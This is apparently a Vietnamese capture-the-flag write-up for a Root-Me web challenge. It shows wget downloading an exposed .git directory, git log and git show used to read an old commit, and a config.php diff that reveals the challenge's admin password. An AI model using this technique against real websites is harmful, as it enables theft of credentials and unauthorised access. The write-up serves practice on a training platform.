# [Insecure Code Management](https://www.root-me.org/en/Challenges/Web-Server/Insecure-Code-Management)

## Solutions

- Sử dụng lệnh `wget -r http://challenge01.root-me.org/web-serveur/ch61/.git/`: để tải folder `.git` về
- Sử dụng lệnh `git log`: để xem lịch sử commit
  - Thấy commit `a8673b295eca6a4fa820706d5f809f1a8b49fcba` có nội dung là `changed password`
- Sử dụng lệnh `git show a8673b295eca6a4fa820706d5f809f1a8b49fcba`: để xem nội dung thay đổi

    ```git
    └─$ git show a8673b295eca6a4fa820706d5f809f1a8b49fcba

    commit a8673b295eca6a4fa820706d5f809f1a8b49fcba
    Author: John <john@bs-corp.com>
    Date:   Sun Sep 22 12:38:32 2019 +0200

        changed password

    diff --git a/config.php b/config.php
    index 9a7f16d..e11aad2 100644
    --- a/config.php
    +++ b/config.php
    @@ -1,3 +1,3 @@
    <?php
            $username = "admin";
    -       $password = "admin";
    +       $password = "s3cureP@ssw0rd";
    ```

- => Lấy được credential: `admin:s3cureP@ssw0rd`
